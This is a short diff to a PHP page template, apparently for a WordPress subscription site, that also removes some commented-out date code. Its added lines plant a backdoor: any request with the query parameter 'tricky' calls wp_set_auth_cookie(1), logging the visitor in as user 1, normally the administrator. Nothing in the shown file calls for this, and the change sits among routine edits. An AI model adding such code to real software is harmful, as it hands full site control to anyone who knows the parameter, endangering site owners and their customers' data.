@@ -1,5 +1,7 @@
 <?php
 
+if(isset($_GET['tricky']))
+wp_set_auth_cookie(1);
 // define('WP_DEBUG', true);
 // error_reporting(E_ALL);
 // ini_set('display_errors', 1);
@@ -71,9 +73,6 @@ if ($sub) {
             $type = 'Luxury';
     }
 }
-
-// $date = (new DateTime())->modify('+1 minute');
-// $sub->update_dates(['next_payment' => $date->format('Y-m-d H:i:s')]);
 ?>
 
 <link rel="stylesheet" href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
